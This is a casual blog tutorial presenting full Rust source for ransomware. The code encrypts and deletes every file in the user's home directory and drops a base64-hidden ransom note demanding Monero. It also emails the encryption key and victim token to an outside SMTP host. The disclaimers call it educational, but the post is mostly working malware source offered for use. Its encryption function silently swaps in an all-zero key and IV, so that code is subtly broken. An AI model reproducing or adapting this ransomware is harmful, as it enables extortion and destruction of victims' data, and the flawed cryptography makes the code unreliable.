# 🖤 sad's Guide to Encrypting/Decrypting Files  🖤

Original post: https://blog.spacehey.com/entry?id=634562

---

Today, I'll share a little project I've been working on in **Rust** that encrypts and decrypts files in your home directory. It's like a little secret between you and your computer. Or you can use it to mess with your friends or whatever! ✨

> [!WARNING]
> This is "educational" content. Please don’t do anything illegal or stupid with this knowledge. I am not responsible for what you do!

---

## Why Rust?

Rust is new, fast, and memory-safe. Not many people use it for stuff like this yet, but trust me, it's got tons of potential. I won't bore you with the many reasons — just know it's very cool.

## What Is This and Why Did I Make It?

This started as a silly project (shitty code for some crappy ransomware) I wrote when I was emotionally drunk, half to suppress my intrusive thoughts...

(And yes, it uses Rust. And no, not _The Game_. I just press buttons all day tbh.)

---

## Let's Dive Into The Code!

### 1. Create the Rust Project

```sh
cargo new iwannadie && cd iwannadie
```

### 2. Add Dependencies

Edit your `Cargo.toml` and add:

```toml
[dependencies]
libaes = "0.6.4"
base64 = "0.21.0"
rand = "0.8.5"
hex = "0.4.3"
tokio = { version = "1.26.0", features = ["full"] }
lettre = "0.10.3"
lettre_email = "0.9.4"
dirs = "4.0"
uuid = { version = "1.3.0", features = ["v4"] }
```

### 3. Import Crates in `main.rs`

```rust
use rand::Rng;
use std::{env, fs};
use libaes::Cipher;
use uuid::Uuid;

use lettre::transport::smtp::authentication::Credentials;
use lettre::{Message, SmtpTransport, Transport};
use tokio::runtime::Runtime;
use std::convert::TryInto;
```

---

## 4. The Main Function

Let's get started:

```rust
fn main() {
    let args: Vec<_> = env::args().collect();
    let folder = dirs::home_dir().expect("Could not find user's home directory");
    let action = if args.len() > 1 && args[1] == "--decrypt" {
        "decrypt"
    } else {
        "encrypt"
    };

    let entries = fs::read_dir(folder.clone()).unwrap();

    // Generate the token only during encryption
    let token = if action == "encrypt" {
        Some(Uuid::new_v4().to_string())
    } else {
        None
    };
```
> [!NOTE]
> **What’s happening here?**
> - We collect arguments to decide `'encrypt'` or `'decrypt'`.  
> - We grab the user's home folder.  
> - We scan the directory.  
> - We generate a UUID token (only for encrypt action).

---

Continuing with the important bits:

```rust
    let mut key = [0u8; 32];
    let mut iv = [0u8; 16];

    if action == "encrypt" {
        let mut rng = rand::thread_rng();
        rng.fill(&mut key);
        rng.fill(&mut iv);
    } else if action == "decrypt" {
        let folder = env::current_exe().unwrap().parent().unwrap().to_path_buf();
        let keys_content = fs::read(folder.join("keys")).unwrap();
        let keys_str = String::from_utf8_lossy(&keys_content);
        let keys_lines: Vec<&str> = keys_str.lines().collect();
        if keys_lines.len() >= 2 {
            key = base64::decode(keys_lines[keys_lines.len() - 2])
                .unwrap()
                .try_into()
                .expect("Invalid key length");
            iv = base64::decode(keys_lines[keys_lines.len() - 1])
                .unwrap()
                .try_into()
                .expect("Invalid IV length");
        } else {
            println!("[-] No keys found!");
            return;
        }
    }
```

### **About the Key and IV**

- The **key** is for AES-256 encryption: 256 bits (32 bytes).
- The **IV** (Initialization Vector): 128 bits (16 bytes).
- For `"encrypt"`, they're randomly generated.  
- For `"decrypt"`, they’re read from a file called `keys`, Base64-decoded.

Format of the `keys` file:

```
hlhBoeH7opPc4GtTDEVI7yUFnTLEuAhjzfo6JNuxIfU=
4+hWMrqB2JoEFaSsu7OgzQ==
```

---

Continue with scanning the files:

```rust
    let current_exe = env::current_exe().unwrap();

    for raw_entry in entries {
        let entry = raw_entry.unwrap();

        if entry.file_type().unwrap().is_file() {
            if entry.file_name().to_str().unwrap().eq("iwannadie.txt")
                || entry.path() == current_exe
            {
                continue;
            }
            if encrypt_decrypt(entry.path().to_str().unwrap(), action, &key, &iv) {
                println!("[+] {} is {}ed!", entry.path().to_str().unwrap(), action);
            }
        }
    }
```
- We avoid encrypting the binary itself and the ransom note.
- Each file gets encrypted or decrypted as needed.

---

## 5. Doing the Ransom Note and Email Stuff

```rust
    if let Some(token) = token {
        println!("Token: {}", token);

        let encoded_ransom_note = "4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOw4qO/4qO/4qO24qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKisOKjv+Khn+KggeKgiOKgu+Kjt+KjpuKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjsOKjv+Kjt+KjpuKhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDio7/ioZ/ioIDioIDioIDioIDioIjioLvio7/io6bioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqDio7/iob/ioIvioJnioLvio7fio4TioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCg4qK54qGf4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qK74qO/4qOm4qGA4qCA4qOA4qOA4qOA4qOA4qOA4qOA4qOA4qOA4qO+4qGf4qCB4qCA4qCA4qCA4qCI4qC74qO34qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKioOKjv+KggOKggOKggOKggOKggOKggOKggOKggOKigOKjoOKhv+Kgn+Kgm+Kgm+KgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgmeKgm+Kgm+Kgm+KgtuKgpOKjveKjv+Kjt+KjhOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioLjioJ/ioIDioIDioIDioIDioIDioIDiooDio7TioJ/ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIjioJnioLvioLfio6Tio4DioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qG+4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qCZ4qK34qGE4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjvOKgj+KggOKggOKggOKggOKggOKggOKggOKggOKjgOKjgOKjgOKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgmOKjv+KggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDiooDiob7ioIPioIDioIDioIDioIDioIDiooDio7TioL7ioJvioonio4Hio4nio4nioZnioLfio4TioIDioIDioIDiorLioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qOn4qCA4qCA4qCA4qCA4qCA4qOw4qCf4qKB4qG04qCa4qCJ4qCA4qCA4qCA4qCZ4qKm4qGI4qK34qGA4qCA4qCI4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKiv+KhhOKggOKggOKggOKjsOKgj+KjoOKgj+KggOKggOKggOKggOKggOKggOKggOKgiOKjp+KgmOKjt+KggOKggOKiueKjpuKggOKggOKggOKggOKggOKggOKigOKjpOKhtOKgtuKgtuKjv+KjhOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorfioIDioIDiooDio7/ioqDioY/ioIDioIDioIDioIDioIDioIDioIDioIDioIDio77ioIDiorjioYbioIDioIjioLvioITioIDioIDioIDio6Dio77io5/io6XioJTioLLio4TioIDioJniorfioYQK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCY4qOH4qCA4qK44qGH4qK44qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qGf4qCA4qCA4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qO84qO/4qG/4qCJ4qCA4qCA4qCA4qCY4qOn4qCA4qCI4qOnCuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiueKhhuKiuOKhh+KiuOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKjvuKhp+KggOKigOKhh+KggOKggOKggOKggOKggOKjvOKir+Khv+KggOKggOKggOKggOKggOKggOKiuOKggOKggOKjvwrioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorfioJjio7fioJjio6bioIDioIDioIDiooDio6Tio7bioK/ioInio7/ioIHio7Dio7/ioIPioIDioIDioIDioIDiorjioZ/io7zioIDioIDioIDioIDioIDioIDioIDio77ioIDioqDioZ8K4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOA4qOA4qO44qOE4qC54qOn4qCZ4qCm4qOA4qOg4qCe4qGb4qCB4qCA4qOw4qCP4qCA4qO14qGf4qCA4qCA4qCA4qCA4qCA4qO/4qKj4qGH4qCA4qCA4qCA4qCA4qCA4qOA4qG04qCP4qKA4qO/4qCDCuKggOKggOKggOKggOKggOKggOKggOKjoOKhtOKgi+KjieKjoOKjpOKjpOKhpOKjveKjt+KjhOKggOKggOKggOKgk+KgpOKgnuKggeKjgOKhvOKgj+KggOKggOKggOKggOKggOKggOKjv+KggOKhh+KggOKggOKigOKjpOKgn+Kjj+KjgOKjvOKjv+Kgj+KggArioIDioIDioIDioIDioIDioIDio7zioI/io6Dio7/io7/io7/io7/io7/ioIDioqDio7/io7/ioJvioLfioqTio6Tio6TiobbioL/ioL/ioaTioqTio4Tio4Dio4DioIDioIDioIDiorvioYbioJnioKbioLTiopvioIHio6DioZ7ioonio77ioI/ioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCA4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qOE4qOA4qO+4qO/4qO/4qGE4qCA4qO04qO/4qO/4qO34qCA4qCJ4qKZ4qO/4qO24qC84qO34qOE4qCA4qCA4qCI4qCb4qOL4qOg4qCf4qCB4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKgueKjp+KgueKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjn+Kjv+Kjv+Kjv+KjvuKjv+Kjv+Kjv+Kiv+KjgOKjgOKjvOKjv+Kiv+KjhuKhgOKimeKjt+KjtuKjtuKjvuKiv+KjheKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIjioLPio6Tio5nioLvioL/io7/io7/ioIPioIDio7/io7/io7/ioJ/ioIniornio7/io6fiob/ioL/ior/io6zio7/io7/io7/io7/io7fio7/io6fio7zio7/io7/io7/io7/ioYfiornioYTioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCJ4qCZ4qCz4qKm4qOt4qOZ4qGz4qC+4qO/4qOB4qOA4qCA4qC44qO/4qC/4qCB4qCA4qK44qO/4qO/4qO/4qCP4qK54qO/4qKI4qO/4qO/4qO/4qO/4qO/4qO/4qGH4qKg4qGH4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKjoOKhtuKjv+KjieKjieKjieKht+KjtuKgn+KiuuKhj+KgieKgm+Kgs+KgtuKjreKjjeKjm+KhtuKgtuKgpOKjhOKjiOKjmeKgi+KggeKggOKgmOKiv+Kjv+Kjv+Kjv+Kjv+Kjv+Khv+Kgm+KjoeKgnuKggeKggOKggOKggOKggArioIDioIDioIDioqDiob/ioY/ioqDio6TioqTio6Tio4Dio6Dio77ioIDioIjioqfio4Dio6TioLbio77ioIvioInioIjioInioJnioJPioLbioLbioqzio4nio4nio4nio4nio5vio7/io77io4/io63ioLbioJ7ioIvioIHioIDioIDioIDioIDioIDioIAK4qCA4qCA4qKg4qGP4qCA4qO74qO/4qCZ4qKm4qGA4qCI4qO/4qC44qOn4qCA4qCI4qKJ4qOk4qCe4qCL4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qO/4qO/4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKigOKjv+KggOKjoOKgj+KjueKhtuKjruKjt+KioOKhv+KggOKgueKjp+KhtOKgm+KgieKjs+KghuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjv+Kjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIjiorvio7bioovio7ziob/ioLPio7/io7niob/ioqfio6Tio6Tio7/io6Hio7TioY/ioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioY/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qO54qO/4qO/4qGA4qO84qCL4qCJ4qCB4qCA4qCA4qO94qCP4qK54qCA4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qG/4qCH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKjvOKgj+KjuOKgj+KjueKit+KjpOKjhOKjgOKjgOKjsOKhn+KggOKiuOKhtOKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggAriooDio7zio4PiorDioY/ioqDioY/ioIDioIjioInioInioYnio73io7PioIbioJjioYfioYcKCgpPSCBOTyEKWU9VUiBTVElOS1kgSFVNQU4gRklMRVMgSEFWRSBCRUVOIEVOQ1JZUFRFRCBCWSBBIENVUklPVVMgRkVNQk9ZIENBVCEgWDMKV0hBVCBTSE9VTEQgWU9VIERPPy4uLgpITU0uLiBMRVQgTUUgVEhJTksuLi4KT0ghIEkgR09UIElUISBYRApZT1UgR09UVEEgU0VORCBNRSBTT01FVEhJTkdTISBIQUhBIDwzClNFTkQgMSBYTVIgVE8gCjQ1N2dNOE5TYThUR003REV0RTMyTUNFZlNqRFVFY1YzQVdIdVhoMVhTWjMzQWhLU3pUTHFFSERVUlJGRnU4ejdKdVdBaTYzc2NIeXV0NnBNQk5LMkIzNmhDdWM3RThRCkFORCBFTUFJTCBTNERAVENQLldJS0kgV0hFTiBUSEUgVFJBTlNBQ1RJT04gRklOSVNIRVMKICAgIE9IIFlFQUghCkRPTlQgRk9SR0VUIFRPIEFERCBZT1VSIFRPS0VOIGluIHRoZSBlbWFpbCBvciB5b3VyIGZ1Y2tlZCBMT0wgCiAgICAgICAgPDMgbG92ZSA8MyAKICAgICAgICAgICAgeW91cnMgdHJ1bHkKICAgICAgICAgICAgICAgfiBzYWQgLyBzNGQgPDM=";
        let decoded_ransom_note = base64::decode(encoded_ransom_note).unwrap();
        let ransom_message = format!("{} Token: {}", String::from_utf8_lossy(&decoded_ransom_note), token);

        let readme_path = folder.join("iwannadie.txt");
        fs::write(readme_path, &ransom_message).unwrap();

        // Build the keys string
        let keys = format!("Key: {}\nIV: {}\nToken: {}", base64::encode(&key), base64::encode(&iv), token);

        // Send the keys via email
        let rt = Runtime::new().unwrap();
        rt.block_on(async {
            send_email(&token, &keys).await.unwrap();
        });

        println!("[+] Dropped ransom message!");
    }
}

Okaiii! fun stuff happening right here!

we print out the token from the generated uuid earlier and add that to the ransom note/love letter (decrypt my heart bb)

ransom_note is encoded in base64 becuz we got some pretty sick ascii art encoded with it aswell as instructions on how to proceed.

**How does this section work?**
- Prints the UUID token.
- Decodes a base64 ransom note (with some sweet ASCII art and instructions).
- Writes a ransom note text file in the home directory.
- Formats an email with the key, IV, and token.
- Sends the key info via SMTP using your creds (edit as needed).

Example Email body:

```
Key: hlhBoeH7opPc4GtTDEVI7yUFnTLEuAhjzfo6JNuxIfU=
IV: 4+hWMrqB2JoEFaSsu7OgzQ==
Token: 8340f29d-7391-4aab-a6ea-da7fe31db99b
```

---

## 6. Sending the Email (Async Function)

we then call the tokio runtime and let it know to be asyncy when sending the email then drop the note to the folder/directory and close the main function!
NEXT!!
```rust
async fn send_email(token: &str, keys: &str) -> Result<(), Box<dyn std::error::Error>> { 
    // Create the email
    let email = Message::builder()
        .from("g1r[@]tcp[.]wiki".parse().unwrap())
        .to("s4d[@]tcp[.]wiki".parse().unwrap())
        .subject(token)
        .body(keys.to_string())?;

    // Set up the SMTP client
    let creds = Credentials::new("g1r".to_string(), "no this is my password!!!".to_string());
    let smtp_server = "mail.tcp.wiki";
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds)
        .build();

    // Send the email
    mailer.send(&email);

    println!("[+] Email sent!");

    Ok(())
}
```

This uses the [`lettre`](https://lettre.rs/) crate (which is awesome) to send the credentials and email to your desired address. Set the addresses and password as needed.

> [!TIP]
> You can set _To_ and _From_ addresses in any valid format you want.

---

## 7. The Actual Encrypt/Decrypt Function

```rust
fn encrypt_decrypt(file_name: &str, action: &str, key: &[u8; 32], iv: &[u8; 16]) -> bool {
    let key = [0u8; 32];
    let iv = [0u8; 16];
    let cipher = Cipher::new_256(&key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);
            let encrypted = cipher.cbc_encrypt(&iv, &fs::read(file_name).unwrap());
            let new_filename = format!("{}.kms", file_name);
            fs::write(&new_filename, encrypted).unwrap();
            fs::remove_file(file_name).unwrap();
        }
        "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(&iv, &fs::read(file_name).unwrap());
            let new_filename = file_name.replace(".kms", "");
            fs::write(&new_filename, decrypted).unwrap();
            fs::remove_file(file_name).unwrap();
        }
        _ => {
            println!("[-] Invalid action!");
            return false;
        }
    }
    true
}
```

- Encrypts files with the `.kms` extension using AES-256.
- Decrypts them and removes the `.kms` extension.
- Handles files found in the target directory.

---

## That's It!

You've just created some _shitty ransomware_ for educational fun!  
(Inspiration sources: ask me for credits)

---

**Remember:** This is just a fun little project, _please_ don't use it for anything naughty! 🖤

